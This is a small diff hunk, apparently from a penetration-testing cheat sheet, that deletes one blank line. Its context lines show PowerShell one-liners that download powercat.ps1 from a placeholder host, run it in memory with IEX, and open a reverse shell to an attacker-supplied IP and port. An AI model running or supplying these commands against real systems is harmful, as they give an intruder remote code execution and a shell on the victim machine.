@@ -19,7 +19,6 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://<ip>/powercat.ps1")
 
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"
 
-
 ```
 
 ###### Base64 Encode
